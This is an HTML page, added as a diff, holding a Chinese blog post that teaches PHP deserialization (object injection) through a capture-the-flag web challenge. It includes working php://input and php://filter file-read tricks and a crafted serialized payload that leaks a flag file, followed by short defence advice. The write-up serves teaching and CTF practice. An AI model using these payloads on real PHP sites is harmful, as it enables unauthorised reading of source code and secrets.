@@ -1,0 +1,919 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Web,php," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://github.com/Windylh/image/raw/master/icon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
+php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2018/11/01/php反序列化漏洞利用/index.html">
+<meta property="og:site_name" content="Windylh's blog">
+<meta property="og:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
+php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-3.png">
+<meta property="og:updated_time" content="2018-11-01T00:55:31.080Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php反序列化漏洞利用">
+<meta name="twitter:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
+php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/01/php反序列化漏洞利用/"/>
+
+
+
+
+
+  <title> php反序列化漏洞利用 | Windylh's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Windylh's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/php反序列化漏洞利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                php反序列化漏洞利用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-01T16:11:12+08:00">
+                2018-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/01/php反序列化漏洞利用/" class="leancloud_visitors" data-flag-title="php反序列化漏洞利用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-unserialize函数"><a href="#0x00-unserialize函数" class="headerlink" title="0x00 unserialize函数"></a>0x00 unserialize函数</h2><p>讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。</p>
+<p>php官方文档对unserialize()的说明是：<strong>unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。</strong></p>
+<p>这也是我们要去利用的地方。</p>
+<a id="more"></a>
+<h2 id="0x01-理解序列化的字符串"><a href="#0x01-理解序列化的字符串" class="headerlink" title="0x01 理解序列化的字符串"></a>0x01 理解序列化的字符串</h2><p>要学习反序列化漏洞，还要明白序列化后的字符串的意义，方便我们构造payload。</p>
+<p>例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">'233.txt'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a = <span class="keyword">new</span> foo();</div><div class="line"><span class="keyword">echo</span> $a-&gt;filename.<span class="string">'&lt;br /&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> serialize($a);</div></pre></td></tr></table></figure></p>
+<p>运行这个php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">233.txt</div><div class="line">O:3:&quot;foo&quot;:1:&#123;s:8:&quot;filename&quot;;s:7:&quot;233.txt&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>第二行就是我们序列化之后的内容，我们来分析一下</p>
+<blockquote>
+<p>O：对象，对象名长度为3，名字为“foo”，有一个参数。</p>
+<p>s：字符串，长度为8，变量名字符串为“filename”</p>
+</blockquote>
+<p>我们执行序列化之后可以将类，数组等压缩到一起。</p>
+<blockquote>
+<p>注：a表示数组，i表示integer</p>
+</blockquote>
+<h2 id="0x02-php反序列化漏洞"><a href="#0x02-php反序列化漏洞" class="headerlink" title="0x02 php反序列化漏洞"></a>0x02 php反序列化漏洞</h2><p>php反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE)</p>
+<p>反序列化漏洞的执行过程就是通过可控的unserialze函数，构造一个类，调用这个类并执行魔术方法，然后执行类中的函数，达到攻击目的。</p>
+<p>所以要利用反序列化必须满足两个条件：</p>
+<blockquote>
+<p>1、应用程序中必须有一个实现某种php魔术方法的类，可用于执行恶意攻击。</p>
+<p>2、当调用脆弱的unserialize()时，必须声明攻击期间所使用的所有类，否则必须支持此类的对象自动加载。</p>
+</blockquote>
+<h2 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h2><p>魔术方法不需要调用就可以执行。<br>常见的魔术方法如下：</p>
+<blockquote>
+<p>__construct() 类的构造函数</p>
+<p>__destruct() 类的析构函数</p>
+<p>__call() 在对象中调用一个不可访问方法时调用</p>
+<p>__callStatic() 用静态方式中调用一个不可访问方法时调用</p>
+<p>__get() 获得一个类的成员变量时调用</p>
+<p>__set() 设置一个类的成员变量时调用</p>
+<p>__isset() 当对不可访问属性调用isset()或empty()时调用</p>
+<p>__unset() 当对不可访问属性调用unset()时被调用</p>
+<p>__sleep() 执行serialize()时，先会调用这个函数</p>
+<p>__wakeup() 执行unserialize()时，先会调用这个函数</p>
+<p>__toString() 类被当成字符串时的回应方法</p>
+<p>__invoke() 调用函数的方式调用一个对象时的回应方法</p>
+<p>__set_state() 调用var_export()导出类时，此静态方法会被调用</p>
+<p>__clone() 当对象复制完成时调用</p>
+<p>__debugInfo() 打印所需调试信息</p>
+<p>__autoload() 尝试加载未定义的类</p>
+</blockquote>
+<h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><p>HBctf中有一道综合性的web题，最后的部分刚好是反序列化。</p>
+<p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">you are not admin ! </div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"> --&gt;</div></pre></td></tr></table></figure></p>
+<p>直接在get中构造赋值并没有用。</p>
+<p>想到了php的伪协议 <code>php：//input</code>，同时post数据<code>the user is admin</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png" alt="1-1"><br>第一步绕过，到了<code>include($file); //class.php</code>，提示我读取class.php</p>
+<p>可以运用伪协议<code>php://filter</code>读取文件</p>
+<p>利用方法：<code>php://filter/convert.base64-encode/resource=xxxxx.php</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png" alt="1-2"><br>得到base64编码后的class.php,解密得：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这里定义了一个Read类，有魔术方法__toString。</p>
+<p>然后我用php伪协议读取了一下index.php，真正的源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment"># index.php</span></div><div class="line">$user = <span class="keyword">isset</span>($_GET[<span class="string">'user'</span>])?$_GET[<span class="string">"user"</span>]:<span class="string">""</span>;</div><div class="line">$file = <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">"file"</span>]:<span class="string">"class.php"</span>;</div><div class="line">$pass = <span class="keyword">isset</span>($_GET[<span class="string">"pass"</span>])?$_GET[<span class="string">"pass"</span>]:<span class="string">""</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">        $pass = unserialize($pass);</div><div class="line">        <span class="keyword">echo</span> $pass;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>有unserialize()，有class类和魔术方法__toString()，我们就可以进行反序列化攻击了。</p>
+<p>构造：<code>O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;}</code></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-3.png" alt="1-3"></p>
+<p>解base64编码，得到flag。</p>
+<p>bugku中的一个题与这个类似，有兴趣的可以去尝试一下</p>
+<p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="external">http://120.24.86.145:8006/test1/index.php</a></p>
+<h2 id="0x04-如何防御php反序列化漏洞"><a href="#0x04-如何防御php反序列化漏洞" class="headerlink" title="0x04 如何防御php反序列化漏洞"></a>0x04 如何防御php反序列化漏洞</h2><p>防御php反序列化漏洞很简单。</p>
+<blockquote>
+<p>1、对参数进行过滤转义处理。</p>
+<p>2、换用更安全的函数。</p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/01/Ourphp后台getshell漏洞/" rel="next" title="Ourphp后台getshell漏洞">
+                <i class="fa fa-chevron-left"></i> Ourphp后台getshell漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/01/PicoCTF-level1-WriteUp/" rel="prev" title="PicoCTF Level1 WriteUp">
+                PicoCTF Level1 WriteUp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
+               alt="Windylh" />
+          <p class="site-author-name" itemprop="name">Windylh</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Windylh" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/WindylhPeng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1553700980" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.izilong.net/" title="Zilong" target="_blank">Zilong</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://iwenhu.cn/" title="Mengchen" target="_blank">Mengchen</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://keysking.github.io/" title="Keysking" target="_blank">Keysking</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lanvnal.com/" title="LANVNAL" target="_blank">LANVNAL</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsimp1er.com/" title="Simp1er" target="_blank">Simp1er</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-unserialize函数"><span class="nav-number">1.</span> <span class="nav-text">0x00 unserialize函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-理解序列化的字符串"><span class="nav-number">2.</span> <span class="nav-text">0x01 理解序列化的字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-php反序列化漏洞"><span class="nav-number">3.</span> <span class="nav-text">0x02 php反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#魔术方法："><span class="nav-number">4.</span> <span class="nav-text">魔术方法：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-实战"><span class="nav-number">5.</span> <span class="nav-text">0x03 实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-如何防御php反序列化漏洞"><span class="nav-number">6.</span> <span class="nav-text">0x04 如何防御php反序列化漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017.3 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("G38Wjo4XURoegldByMbpMI2C-gzGzoHsz", "PAvMrVY87vPwX9PBcMLfYmw4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
